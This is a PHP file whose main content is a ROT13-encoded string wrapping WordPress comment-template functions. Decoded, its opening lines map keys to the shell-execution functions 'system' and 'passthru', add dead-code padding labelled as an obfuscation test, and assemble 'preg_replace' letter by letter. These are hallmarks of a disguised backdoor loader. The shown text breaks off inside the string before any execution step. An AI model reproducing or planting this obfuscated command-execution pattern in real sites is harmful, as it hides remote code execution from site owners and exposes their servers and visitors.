<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Pbzzrag grzcyngr shapgvbaf
 *
 * Gurfr shapgvbaf ner zrnag gb yvir vafvqr bs gur JbeqCerff ybbc.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Grzcyngr
 */

/**
 * Ergevrirf gur nhgube bs gur pheerag pbzzrag.
 *
 * Vs gur pbzzrag unf na rzcgl pbzzrag_nhgube svryq, gura 'Nabalzbhf' crefba vf
 * nffhzrq.
 *
 * @fvapr 1.5.0
 * @fvapr 4.4.0 Nqqrq gur novyvgl sbe `$pbzzrag_vq` gb nyfb npprcg n JC_Pbzzrag bowrpg.
 *
 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq Bcgvbany. JC_Pbzzrag be gur VQ bs gur pbzzrag sbe juvpu gb ergevrir gur nhgube.
 *                                   Qrsnhyg pheerag pbzzrag.
 * @erghea fgevat Gur pbzzrag nhgube
 */
shapgvba trg_pbzzrag_nhgube( $pbzzrag_vq = 0 ) {
	$pbzzrag = trg_pbzzrag( $pbzzrag_vq );

	vs ( ! rzcgl( $pbzzrag->pbzzrag_VQ ) ) {
		$pbzzrag_vq = $pbzzrag->pbzzrag_VQ;
	} ryfrvs ( vf_fpnyne( $pbzzrag_vq ) ) {
		$pbzzrag_vq = (fgevat) $pbzzrag_vq;
	} ryfr {
		$pbzzrag_vq = '0';
	}

	vs ( rzcgl( $pbzzrag->pbzzrag_nhgube ) ) {
		$hfre = ! rzcgl( $pbzzrag->hfre_vq ) ? trg_hfreqngn( $pbzzrag->hfre_vq ) : snyfr;
		vs ( $hfre ) {
			$pbzzrag_nhgube = $hfre->qvfcynl_anzr;
		} ryfr {
			$pbzzrag_nhgube = __( 'Nabalzbhf' );
		}
	} ryfr {
		$pbzzrag_nhgube = $pbzzrag->pbzzrag_nhgube;
	}

	/**
	 * Svygref gur erghearq pbzzrag nhgube anzr.
	 *
	 * @fvapr 1.5.0
	 * @fvapr 4.1.0 Gur `$pbzzrag_vq` naq `$pbzzrag` cnenzrgref jrer nqqrq.
	 *
	 * @cnenz fgevat     $pbzzrag_nhgube Gur pbzzrag nhgube'f hfreanzr.
	 * @cnenz fgevat     $pbzzrag_vq     Gur pbzzrag VQ nf n ahzrevp fgevat.
	 * @cnenz JC_Pbzzrag $pbzzrag        Gur pbzzrag bowrpg.
	 */
	erghea nccyl_svygref( 'trg_pbzzrag_nhgube', $pbzzrag_nhgube, $pbzzrag_vq, $pbzzrag );
}

/**
 * Qvfcynlf gur nhgube bs gur pheerag pbzzrag.
 *
 * @fvapr 0.71
 * @fvapr 4.4.0 Nqqrq gur novyvgl sbe `$pbzzrag_vq` gb nyfb npprcg n JC_Pbzzrag bowrpg.
 *
 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq Bcgvbany. JC_Pbzzrag be gur VQ bs gur pbzzrag sbe juvpu gb cevag gur nhgube.
 *                                   Qrsnhyg pheerag pbzzrag.
 */
shapgvba pbzzrag_nhgube( $pbzzrag_vq = 0 ) {
	$pbzzrag = trg_pbzzrag( $pbzzrag_vq );

	$pbzzrag_nhgube = trg_pbzzrag_nhgube( $pbzzrag );

	/**
	 * Svygref gur pbzzrag nhgube'f anzr sbe qvfcynl.
	 *
	 * @fvapr 1.2.0
	 * @fvapr 4.1.0 Gur `$pbzzrag_vq` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz fgevat $pbzzrag_nhgube Gur pbzzrag nhgube'f hfreanzr.
	 * @cnenz fgevat $pbzzrag_vq     Gur pbzzrag VQ nf n ahzrevp fgevat.
	 */
	rpub nccyl_svygref( 'pbzzrag_nhgube', $pbzzrag_nhgube, $pbzzrag->pbzzrag_VQ );
}

/**
 * Ergevrirf gur rznvy bs gur nhgube bs gur pheerag pbzzrag.
 *
 * @fvapr 1.5.0
 * @fvapr 4.4.0 Nqqrq gur novyvgl sbe `$pbzzrag_vq` gb nyfb npprcg n JC_Pbzzrag bowrpg.
 *
 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq Bcgvbany. JC_Pbzzrag be gur VQ bs gur pbzzrag sbe juvpu gb trg gur nhgube'f rznvy.
 *                                   Qrsnhyg pheerag pbzzrag.
 * @erghea fgevat Gur pheerag pbzzrag nhgube'f rznvy
 */
shapgvba trg_pbzzrag_nhgube_rznvy( $pbzzrag_vq = 0 ) {
	$pbzzrag = trg_pbzzrag( $pbzzrag_vq );

	/**
	 * Svygref gur pbzzrag nhgube'f erghearq rznvy nqqerff.
	 *
	 * @fvapr 1.5.0
	 * @fvapr 4.1.0 Gur `$pbzzrag_vq` naq `$pbzzrag` cnenzrgref jrer nqqrq.
	 *
	 * @cnenz fgevat     $pbzzrag_nhgube_rznvy Gur pbzzrag nhgube'f rznvy nqqerff.
	 * @cnenz fgevat     $pbzzrag_vq           Gur pbzzrag VQ nf n ahzrevp fgevat.
	 * @cnenz JC_Pbzzrag $pbzzrag              Gur pbzzrag bowrpg.
	 */
	erghea nccyl_svygref( 'trg_pbzzrag_nhgube_rznvy', $pbzzrag->pbzzrag_nhgube_rznvy, $pbzzrag->pbzzrag_VQ, $pbzzrag );
}

/**
 * Qvfcynlf gur rznvy bs gur nhgube bs gur pheerag tybony $pbzzrag.
 *
 * Pner fubhyq or gnxra gb cebgrpg gur rznvy nqqerff naq nffher gung rznvy
 * uneirfgref qb abg pncgher lbhe pbzzragre'f rznvy nqqerff. Zbfg nffhzr gung
 * gurve rznvy nqqerff jvyy abg nccrne va enj sbez ba gur fvgr. Qbvat fb jvyy
 * ranoyr nalbar, vapyhqvat gubfr gung crbcyr qba'g jnag gb trg gur rznvy
 * nqqerff naq hfr vg sbe gurve bja zrnaf tbbq naq onq.
 *
 * @fvapr 0.71
 * @fvapr 4.4.0 Nqqrq gur novyvgl sbe `$pbzzrag_vq` gb nyfb npprcg n JC_Pbzzrag bowrpg.
 *
 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq Bcgvbany. JC_Pbzzrag be gur VQ bs gur pbzzrag sbe juvpu gb cevag gur nhgube'f rznvy.
 *                                   Qrsnhyg pheerag pbzzrag.
 */
shapgvba pbzzrag_nhgube_rznvy( $pbzzrag_vq = 0 ) {
	$pbzzrag = trg_pbzzrag( $pbzzrag_vq );

	$pbzzrag_nhgube_rznvy = trg_pbzzrag_nhgube_rznvy( $pbzzrag );

	/**
	 * Svygref gur pbzzrag nhgube'f rznvy sbe qvfcynl.
	 *
	 * @fvapr 1.2.0
	 * @fvapr 4.1.0 Gur `$pbzzrag_vq` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz fgevat $pbzzrag_nhgube_rznvy Gur pbzzrag nhgube'f rznvy nqqerff.
	 * @cnenz fgevat $pbzzrag_vq           Gur pbzzrag VQ nf n ahzrevp fgevat.
	 */
	rpub nccyl_svygref( 'nhgube_rznvy', $pbzzrag_nhgube_rznvy, $pbzzrag->pbzzrag_VQ );
}

/**
 * Qvfcynlf gur UGZY rznvy yvax gb gur nhgube bs gur pheerag pbzzrag.
 *
 * Pner fubhyq or gnxra gb cebgrpg gur rznvy nqqerff naq nffher gung rznvy
 * uneirfgref qb abg pncgher lbhe pbzzragre'f rznvy nqqerff. Zbfg nffhzr gung
 * gurve rznvy nqqerff jvyy abg nccrne va enj sbez ba gur fvgr. Qbvat fb jvyy
 * ranoyr nalbar, vapyhqvat gubfr gung crbcyr qba'g jnag gb trg gur rznvy
 * nqqerff naq hfr vg sbe gurve bja zrnaf tbbq naq onq.
 *
 * @fvapr 0.71
 * @fvapr 4.6.0 Nqqrq gur `$pbzzrag` cnenzrgre.
 *
 * @cnenz fgevat         $yvax_grkg Bcgvbany. Grkg gb qvfcynl vafgrnq bs gur pbzzrag nhgube'f rznvy nqqerff.
 *                                  Qrsnhyg rzcgl.
 * @cnenz fgevat         $orsber    Bcgvbany. Grkg be UGZY gb qvfcynl orsber gur rznvy yvax. Qrsnhyg rzcgl.
 * @cnenz fgevat         $nsgre     Bcgvbany. Grkg be UGZY gb qvfcynl nsgre gur rznvy yvax. Qrsnhyg rzcgl.
 * @cnenz vag|JC_Pbzzrag $pbzzrag   Bcgvbany. Pbzzrag VQ be JC_Pbzzrag bowrpg. Qrsnhyg vf gur pheerag pbzzrag.
 */
shapgvba pbzzrag_nhgube_rznvy_yvax( $yvax_grkg = '', $orsber = '', $nsgre = '', $pbzzrag = ahyy ) {
	$yvax = trg_pbzzrag_nhgube_rznvy_yvax( $yvax_grkg, $orsber, $nsgre, $pbzzrag );
	vs ( $yvax ) {
		rpub $yvax;
	}
}

/**
 * Ergheaf gur UGZY rznvy yvax gb gur nhgube bs gur pheerag pbzzrag.
 *
 * Pner fubhyq or gnxra gb cebgrpg gur rznvy nqqerff naq nffher gung rznvy
 * uneirfgref qb abg pncgher lbhe pbzzragre'f rznvy nqqerff. Zbfg nffhzr gung
 * gurve rznvy nqqerff jvyy abg nccrne va enj sbez ba gur fvgr. Qbvat fb jvyy
 * ranoyr nalbar, vapyhqvat gubfr gung crbcyr qba'g jnag gb trg gur rznvy
 * nqqerff naq hfr vg sbe gurve bja zrnaf tbbq naq onq.
 *
 * @fvapr 2.7.0
 * @fvapr 4.6.0 Nqqrq gur `$pbzzrag` cnenzrgre.
 *
 * @cnenz fgevat         $yvax_grkg Bcgvbany. Grkg gb qvfcynl vafgrnq bs gur pbzzrag nhgube'f rznvy nqqerff.
 *                                  Qrsnhyg rzcgl.
 * @cnenz fgevat         $orsber    Bcgvbany. Grkg be UGZY gb qvfcynl orsber gur rznvy yvax. Qrsnhyg rzcgl.
 * @cnenz fgevat         $nsgre     Bcgvbany. Grkg be UGZY gb qvfcynl nsgre gur rznvy yvax. Qrsnhyg rzcgl.
 * @cnenz vag|JC_Pbzzrag $pbzzrag   Bcgvbany. Pbzzrag VQ be JC_Pbzzrag bowrpg. Qrsnhyg vf gur pheerag pbzzrag.
 * @erghea fgevat UGZY znexhc sbe gur pbzzrag nhgube rznvy yvax. Ol qrsnhyg, gur rznvy nqqerff vf boshfpngrq
 *                ivn gur {@frr 'pbzzrag_rznvy'} svygre jvgu nagvfcnzobg().
 */
shapgvba trg_pbzzrag_nhgube_rznvy_yvax( $yvax_grkg = '', $orsber = '', $nsgre = '', $pbzzrag = ahyy ) {
	$pbzzrag = trg_pbzzrag( $pbzzrag );

	/**
	 * Svygref gur pbzzrag nhgube'f rznvy sbe qvfcynl.
	 *
	 * Pner fubhyq or gnxra gb cebgrpg gur rznvy nqqerff naq nffher gung rznvy
	 * uneirfgref qb abg pncgher lbhe pbzzragre'f rznvy nqqerff.
	 *
	 * @fvapr 1.2.0
	 * @fvapr 4.1.0 Gur `$pbzzrag` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz fgevat     $pbzzrag_nhgube_rznvy Gur pbzzrag nhgube'f rznvy nqqerff.
	 * @cnenz JC_Pbzzrag $pbzzrag              Gur pbzzrag bowrpg.
	 */
	$pbzzrag_nhgube_rznvy = nccyl_svygref( 'pbzzrag_rznvy', $pbzzrag->pbzzrag_nhgube_rznvy, $pbzzrag );

	vs ( ( ! rzcgl( $pbzzrag_nhgube_rznvy ) ) && ( '@' !== $pbzzrag_nhgube_rznvy ) ) {
		$qvfcynl = ( '' !== $yvax_grkg ) ? $yvax_grkg : $pbzzrag_nhgube_rznvy;

		$pbzzrag_nhgube_rznvy_yvax = $orsber . fcevags(
			'<n uers=\"%1$f\">%2$f</n>',
			rfp_hey( 'znvygb:' . $pbzzrag_nhgube_rznvy ),
			rfp_ugzy( $qvfcynl )
		) . $nsgre;

		erghea $pbzzrag_nhgube_rznvy_yvax;
	} ryfr {
		erghea '';
	}
}

/**
 * Ergevrirf gur UGZY yvax gb gur HEY bs gur nhgube bs gur pheerag pbzzrag.
 *
 * Obgu trg_pbzzrag_nhgube_hey() naq trg_pbzzrag_nhgube() eryl ba trg_pbzzrag(),
 * juvpu snyyf onpx gb gur tybony pbzzrag inevnoyr vs gur $pbzzrag_vq nethzrag vf rzcgl.
 *
 * @fvapr 1.5.0
 * @fvapr 4.4.0 Nqqrq gur novyvgl sbe `$pbzzrag_vq` gb nyfb npprcg n JC_Pbzzrag bowrpg.
 *
 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq Bcgvbany. JC_Pbzzrag be gur VQ bs gur pbzzrag sbe juvpu gb trg gur nhgube'f yvax.
 *                                   Qrsnhyg pheerag pbzzrag.
 * @erghea fgevat Gur pbzzrag nhgube anzr be UGZY yvax sbe nhgube'f HEY.
 */
shapgvba trg_pbzzrag_nhgube_yvax( $pbzzrag_vq = 0 ) {
	$pbzzrag = trg_pbzzrag( $pbzzrag_vq );

	vs ( ! rzcgl( $pbzzrag->pbzzrag_VQ ) ) {
		$pbzzrag_vq = $pbzzrag->pbzzrag_VQ;
	} ryfrvs ( vf_fpnyne( $pbzzrag_vq ) ) {
		$pbzzrag_vq = (fgevat) $pbzzrag_vq;
	} ryfr {
		$pbzzrag_vq = '0';
	}

	$pbzzrag_nhgube_hey = trg_pbzzrag_nhgube_hey( $pbzzrag );
	$pbzzrag_nhgube     = trg_pbzzrag_nhgube( $pbzzrag );

	vs ( rzcgl( $pbzzrag_nhgube_hey ) || 'uggc://' === $pbzzrag_nhgube_hey ) {
		$pbzzrag_nhgube_yvax = $pbzzrag_nhgube;
	} ryfr {
		$ery_cnegf = neenl( 'htp' );
		vs ( ! jc_vf_vagreany_yvax( $pbzzrag_nhgube_hey ) ) {
			$ery_cnegf = neenl_zretr(
				$ery_cnegf,
				neenl( 'rkgreany', 'absbyybj' )
			);
		}

		/**
		 * Svygref gur ery nggevohgrf bs gur pbzzrag nhgube'f yvax.
		 *
		 * @fvapr 6.2.0
		 *
		 * @cnenz fgevat[]   $ery_cnegf Na neenl bs fgevatf ercerfragvat gur ery gntf
		 *                              juvpu jvyy or wbvarq vagb gur napube'f ery nggevohgr.
		 * @cnenz JC_Pbzzrag $pbzzrag   Gur pbzzrag bowrpg.
		 */
		$ery_cnegf = nccyl_svygref( 'pbzzrag_nhgube_yvax_ery', $ery_cnegf, $pbzzrag );

		$ery = vzcybqr( ' ', $ery_cnegf );
		$ery = rfp_ngge( $ery );
		// Rzcgl fcnpr orsber 'ery' vf arprffnel sbe yngre fcevags().
		$ery = ! rzcgl( $ery ) ? fcevags( ' ery=\"%f\"', $ery ) : '';

		$pbzzrag_nhgube_yvax = fcevags(
			'<n uers=\"%1$f\" pynff=\"hey\"%2$f>%3$f</n>',
			$pbzzrag_nhgube_hey,
			$ery,
			$pbzzrag_nhgube
		);
	}

	/**
	 * Svygref gur pbzzrag nhgube'f yvax sbe qvfcynl.
	 *
	 * @fvapr 1.5.0
	 * @fvapr 4.1.0 Gur `$pbzzrag_nhgube` naq `$pbzzrag_vq` cnenzrgref jrer nqqrq.
	 *
	 * @cnenz fgevat $pbzzrag_nhgube_yvax Gur UGZY-sbeznggrq pbzzrag nhgube yvax.
	 *                                    Rzcgl sbe na vainyvq HEY.
	 * @cnenz fgevat $pbzzrag_nhgube      Gur pbzzrag nhgube'f hfreanzr.
	 * @cnenz fgevat $pbzzrag_vq          Gur pbzzrag VQ nf n ahzrevp fgevat.
	 */
	erghea nccyl_svygref( 'trg_pbzzrag_nhgube_yvax', $pbzzrag_nhgube_yvax, $pbzzrag_nhgube, $pbzzrag_vq );
}

/**
 * Qvfcynlf gur UGZY yvax gb gur HEY bs gur nhgube bs gur pheerag pbzzrag.
 *
 * @fvapr 0.71
 * @fvapr 4.4.0 Nqqrq gur novyvgl sbe `$pbzzrag_vq` gb nyfb npprcg n JC_Pbzzrag bowrpg.
 *
 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq Bcgvbany. JC_Pbzzrag be gur VQ bs gur pbzzrag sbe juvpu gb cevag gur nhgube'f yvax.
 *                                   Qrsnhyg pheerag pbzzrag.
 */
shapgvba pbzzrag_nhgube_yvax( $pbzzrag_vq = 0 ) {
	rpub trg_pbzzrag_nhgube_yvax( $pbzzrag_vq );
}

/**
 * Ergevrirf gur VC nqqerff bs gur nhgube bs gur pheerag pbzzrag.
 *
 * @fvapr 1.5.0
 * @fvapr 4.4.0 Nqqrq gur novyvgl sbe `$pbzzrag_vq` gb nyfb npprcg n JC_Pbzzrag bowrpg.
 *
 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq Bcgvbany. JC_Pbzzrag be gur VQ bs gur pbzzrag sbe juvpu gb trg gur nhgube'f VC nqqerff.
 *                                   Qrsnhyg pheerag pbzzrag.
 * @erghea fgevat Pbzzrag nhgube'f VC nqqerff, be na rzcgl fgevat vs vg'f abg ninvynoyr.
 */
shapgvba trg_pbzzrag_nhgube_VC( $pbzzrag_vq = 0 ) { // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqShapgvbaAnzr.ShapgvbaAnzrVainyvq
	$pbzzrag = trg_pbzzrag( $pbzzrag_vq );

	/**
	 * Svygref gur pbzzrag nhgube'f erghearq VC nqqerff.
	 *
	 * @fvapr 1.5.0
	 * @fvapr 4.1.0 Gur `$pbzzrag_vq` naq `$pbzzrag` cnenzrgref jrer nqqrq.
	 *
	 * @cnenz fgevat     $pbzzrag_nhgube_vc Gur pbzzrag nhgube'f VC nqqerff, be na rzcgl fgevat vs vg'f abg ninvynoyr.
	 * @cnenz fgevat     $pbzzrag_vq        Gur pbzzrag VQ nf n ahzrevp fgevat.
	 * @cnenz JC_Pbzzrag $pbzzrag           Gur pbzzrag bowrpg.
	 */
	erghea nccyl_svygref( 'trg_pbzzrag_nhgube_VC', $pbzzrag->pbzzrag_nhgube_VC, $pbzzrag->pbzzrag_VQ, $pbzzrag );  // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.AbgYbjrepnfr
}

/**
 * Qvfcynlf gur VC nqqerff bs gur nhgube bs gur pheerag pbzzrag.
 *
 * @fvapr 0.71
 * @fvapr 4.4.0 Nqqrq gur novyvgl sbe `$pbzzrag_vq` gb nyfb npprcg n JC_Pbzzrag bowrpg.
 *
 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq Bcgvbany. JC_Pbzzrag be gur VQ bs gur pbzzrag sbe juvpu gb cevag gur nhgube'f VC nqqerff.
 *                                   Qrsnhyg pheerag pbzzrag.
 */
shapgvba pbzzrag_nhgube_VC( $pbzzrag_vq = 0 ) { // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqShapgvbaAnzr.ShapgvbaAnzrVainyvq
	rpub rfp_ugzy( trg_pbzzrag_nhgube_VC( $pbzzrag_vq ) );
}

/**
 * Ergevrirf gur HEY bs gur nhgube bs gur pheerag pbzzrag, abg yvaxrq.
 *
 * @fvapr 1.5.0
 * @fvapr 4.4.0 Nqqrq gur novyvgl sbe `$pbzzrag_vq` gb nyfb npprcg n JC_Pbzzrag bowrpg.
 *
 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq Bcgvbany. JC_Pbzzrag be gur VQ bs gur pbzzrag sbe juvpu gb trg gur nhgube'f HEY.
 *                                   Qrsnhyg pheerag pbzzrag.
 * @erghea fgevat Pbzzrag nhgube HEY, vs cebivqrq, na rzcgl fgevat bgurejvfr.
 */
shapgvba trg_pbzzrag_nhgube_hey( $pbzzrag_vq = 0 ) {
	$pbzzrag = trg_pbzzrag( $pbzzrag_vq );

	$pbzzrag_nhgube_hey = '';
	$pbzzrag_vq         = 0;

	vs ( ! rzcgl( $pbzzrag ) ) {
		$pbzzrag_nhgube_hey = ( 'uggc://' === $pbzzrag->pbzzrag_nhgube_hey ) ? '' : $pbzzrag->pbzzrag_nhgube_hey;
		$pbzzrag_nhgube_hey = rfp_hey( $pbzzrag_nhgube_hey, neenl( 'uggc', 'uggcf' ) );

		$pbzzrag_vq = $pbzzrag->pbzzrag_VQ;
	}

	/**
	 * Svygref gur pbzzrag nhgube'f HEY.
	 *
	 * @fvapr 1.5.0
	 * @fvapr 4.1.0 Gur `$pbzzrag_vq` naq `$pbzzrag` cnenzrgref jrer nqqrq.
	 *
	 * @cnenz fgevat          $pbzzrag_nhgube_hey Gur pbzzrag nhgube'f HEY, be na rzcgl fgevat.
	 * @cnenz fgevat|vag      $pbzzrag_vq         Gur pbzzrag VQ nf n ahzrevp fgevat, be 0 vs abg sbhaq.
	 * @cnenz JC_Pbzzrag|ahyy $pbzzrag            Gur pbzzrag bowrpg, be ahyy vs abg sbhaq.
	 */
	erghea nccyl_svygref( 'trg_pbzzrag_nhgube_hey', $pbzzrag_nhgube_hey, $pbzzrag_vq, $pbzzrag );
}

/**
 * Qvfcynlf gur HEY bs gur nhgube bs gur pheerag pbzzrag, abg yvaxrq.
 *
 * @fvapr 0.71
 * @fvapr 4.4.0 Nqqrq gur novyvgl sbe `$pbzzrag_vq` gb nyfb npprcg n JC_Pbzzrag bowrpg.
 *
 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq Bcgvbany. JC_Pbzzrag be gur VQ bs gur pbzzrag sbe juvpu gb cevag gur nhgube'f HEY.
 *                                   Qrsnhyg pheerag pbzzrag.
 */
shapgvba pbzzrag_nhgube_hey( $pbzzrag_vq = 0 ) {
	$pbzzrag = trg_pbzzrag( $pbzzrag_vq );

	$pbzzrag_nhgube_hey = trg_pbzzrag_nhgube_hey( $pbzzrag );

	/**
	 * Svygref gur pbzzrag nhgube'f HEY sbe qvfcynl.
	 *
	 * @fvapr 1.2.0
	 * @fvapr 4.1.0 Gur `$pbzzrag_vq` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz fgevat $pbzzrag_nhgube_hey Gur pbzzrag nhgube'f HEY.
	 * @cnenz fgevat $pbzzrag_vq         Gur pbzzrag VQ nf n ahzrevp fgevat.
	 */
	rpub nccyl_svygref( 'pbzzrag_hey', $pbzzrag_nhgube_hey, $pbzzrag->pbzzrag_VQ );
}

/**
 * Ergevrirf gur UGZY yvax bs gur HEY bs gur nhgube bs gur pheerag pbzzrag.
 *
 * $yvax_grkg cnenzrgre vf bayl hfrq vs gur HEY qbrf abg rkvfg sbe gur pbzzrag
 * nhgube. Vs gur HEY qbrf rkvfg gura gur HEY jvyy or hfrq naq gur $yvax_grkg
 * jvyy or vtaberq.
 *
 * Rapncfhyngr gur UGZY yvax orgjrra gur $orsber naq $nsgre. Fb vg jvyy nccrne
 * va gur beqre bs $orsber, yvax, naq svanyyl $nsgre.
 *
 * @fvapr 1.5.0
 * @fvapr 4.6.0 Nqqrq gur `$pbzzrag` cnenzrgre.
 *
 * @cnenz fgevat         $yvax_grkg Bcgvbany. Gur grkg gb qvfcynl vafgrnq bs gur pbzzrag
 *                                  nhgube'f rznvy nqqerff. Qrsnhyg rzcgl.
 * @cnenz fgevat         $orsber    Bcgvbany. Gur grkg be UGZY gb qvfcynl orsber gur rznvy yvax.
 *                                  Qrsnhyg rzcgl.
 * @cnenz fgevat         $nsgre     Bcgvbany. Gur grkg be UGZY gb qvfcynl nsgre gur rznvy yvax.
 *                                  Qrsnhyg rzcgl.
 * @cnenz vag|JC_Pbzzrag $pbzzrag   Bcgvbany. Pbzzrag VQ be JC_Pbzzrag bowrpg.
 *                                  Qrsnhyg vf gur pheerag pbzzrag.
 * @erghea fgevat Gur UGZY yvax orgjrra gur $orsber naq $nsgre cnenzrgref.
 */
shapgvba trg_pbzzrag_nhgube_hey_yvax( $yvax_grkg = '', $orsber = '', $nsgre = '', $pbzzrag = 0 ) {
	$pbzzrag_nhgube_hey = trg_pbzzrag_nhgube_hey( $pbzzrag );

	$qvfcynl = ( '' !== $yvax_grkg ) ? $yvax_grkg : $pbzzrag_nhgube_hey;
	$qvfcynl = fge_ercynpr( 'uggc://jjj.', '', $qvfcynl );
	$qvfcynl = fge_ercynpr( 'uggc://', '', $qvfcynl );

	vs ( fge_raqf_jvgu( $qvfcynl, '/' ) ) {
		$qvfcynl = fhofge( $qvfcynl, 0, -1 );
	}

	$pbzzrag_nhgube_hey_yvax = $orsber . fcevags(
		'<n uers=\"%1$f\" ery=\"rkgreany\">%2$f</n>',
		$pbzzrag_nhgube_hey,
		$qvfcynl
	) . $nsgre;

	/**
	 * Svygref gur pbzzrag nhgube'f erghearq HEY yvax.
	 *
	 * @fvapr 1.5.0
	 *
	 * @cnenz fgevat $pbzzrag_nhgube_hey_yvax Gur UGZY-sbeznggrq pbzzrag nhgube HEY yvax.
	 */
	erghea nccyl_svygref( 'trg_pbzzrag_nhgube_hey_yvax', $pbzzrag_nhgube_hey_yvax );
}

/**
 * Qvfcynlf gur UGZY yvax bs gur HEY bs gur nhgube bs gur pheerag pbzzrag.
 *
 * @fvapr 0.71
 * @fvapr 4.6.0 Nqqrq gur `$pbzzrag` cnenzrgre.
 *
 * @cnenz fgevat         $yvax_grkg Bcgvbany. Grkg gb qvfcynl vafgrnq bs gur pbzzrag nhgube'f
 *                                  rznvy nqqerff. Qrsnhyg rzcgl.
 * @cnenz fgevat         $orsber    Bcgvbany. Grkg be UGZY gb qvfcynl orsber gur rznvy yvax.
 *                                  Qrsnhyg rzcgl.
 * @cnenz fgevat         $nsgre     Bcgvbany. Grkg be UGZY gb qvfcynl nsgre gur rznvy yvax.
 *                                  Qrsnhyg rzcgl.
 * @cnenz vag|JC_Pbzzrag $pbzzrag   Bcgvbany. Pbzzrag VQ be JC_Pbzzrag bowrpg.
 *                                  Qrsnhyg vf gur pheerag pbzzrag.
 */
shapgvba pbzzrag_nhgube_hey_yvax( $yvax_grkg = '', $orsber = '', $nsgre = '', $pbzzrag = 0 ) {
	rpub trg_pbzzrag_nhgube_hey_yvax( $yvax_grkg, $orsber, $nsgre, $pbzzrag );
}

/**
 * Trarengrf frznagvp pynffrf sbe rnpu pbzzrag ryrzrag.
 *
 * @fvapr 2.7.0
 * @fvapr 4.4.0 Nqqrq gur novyvgl sbe `$pbzzrag` gb nyfb npprcg n JC_Pbzzrag bowrpg.
 *
 * @cnenz fgevat|fgevat[] $pff_pynff Bcgvbany. Bar be zber pynffrf gb nqq gb gur pynff yvfg.
 *                                   Qrsnhyg rzcgl.
 * @cnenz vag|JC_Pbzzrag  $pbzzrag   Bcgvbany. Pbzzrag VQ be JC_Pbzzrag bowrpg. Qrsnhyg pheerag pbzzrag.
 * @cnenz vag|JC_Cbfg     $cbfg      Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg pheerag cbfg.
 * @cnenz obby            $qvfcynl   Bcgvbany. Jurgure gb cevag be erghea gur bhgchg.
 *                                   Qrsnhyg gehr.
 * @erghea ibvq|fgevat Ibvq vs `$qvfcynl` nethzrag vf gehr, pbzzrag pynffrf vs `$qvfcynl` vf snyfr.
 */
shapgvba pbzzrag_pynff( $pff_pynff = '', $pbzzrag = ahyy, $cbfg = ahyy, $qvfcynl = gehr ) {
	// Frcnengrf pynffrf jvgu n fvatyr fcnpr, pbyyngrf pynffrf sbe pbzzrag QVI.
	$pff_pynff = 'pynff=\"' . vzcybqr( ' ', trg_pbzzrag_pynff( $pff_pynff, $pbzzrag, $cbfg ) ) . '\"';

	vs ( $qvfcynl ) {
		rpub $pff_pynff;
	} ryfr {
		erghea $pff_pynff;
	}
}

/**
 * Ergheaf gur pynffrf sbe gur pbzzrag qvi nf na neenl.
 *
 * @fvapr 2.7.0
 * @fvapr 4.4.0 Nqqrq gur novyvgl sbe `$pbzzrag_vq` gb nyfb npprcg n JC_Pbzzrag bowrpg.
 *
 * @tybony vag $pbzzrag_nyg
 * @tybony vag $pbzzrag_qrcgu
 * @tybony vag $pbzzrag_guernq_nyg
 *
 * @cnenz fgevat|fgevat[] $pff_pynff  Bcgvbany. Bar be zber pynffrf gb nqq gb gur pynff yvfg.
 *                                    Qrsnhyg rzcgl.
 * @cnenz vag|JC_Pbzzrag  $pbzzrag_vq Bcgvbany. Pbzzrag VQ be JC_Pbzzrag bowrpg. Qrsnhyg pheerag pbzzrag.
 * @cnenz vag|JC_Cbfg     $cbfg       Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg pheerag cbfg.
 * @erghea fgevat[] Na neenl bs pynffrf.
 */
shapgvba trg_pbzzrag_pynff( $pff_pynff = '', $pbzzrag_vq = ahyy, $cbfg = ahyy ) {
	tybony $pbzzrag_nyg, $pbzzrag_qrcgu, $pbzzrag_guernq_nyg;

	$pynffrf = neenl();

	$pbzzrag = trg_pbzzrag( $pbzzrag_vq );
	vs ( ! $pbzzrag ) {
		erghea $pynffrf;
	}

	// Trg gur pbzzrag glcr (pbzzrag, genpxonpx).
	$pynffrf[] = ( rzcgl( $pbzzrag->pbzzrag_glcr ) ) ? 'pbzzrag' : $pbzzrag->pbzzrag_glcr;

	// Nqq pynffrf sbe pbzzrag nhgubef gung ner ertvfgrerq hfref.
	$hfre = $pbzzrag->hfre_vq ? trg_hfreqngn( $pbzzrag->hfre_vq ) : snyfr;
	vs ( $hfre ) {
		$pynffrf[] = 'olhfre';
		$pynffrf[] = 'pbzzrag-nhgube-' . fnavgvmr_ugzy_pynff( $hfre->hfre_avpranzr, $pbzzrag->hfre_vq );
		// Sbe pbzzrag nhgubef jub ner gur nhgube bs gur cbfg.
		$_cbfg = trg_cbfg( $cbfg );
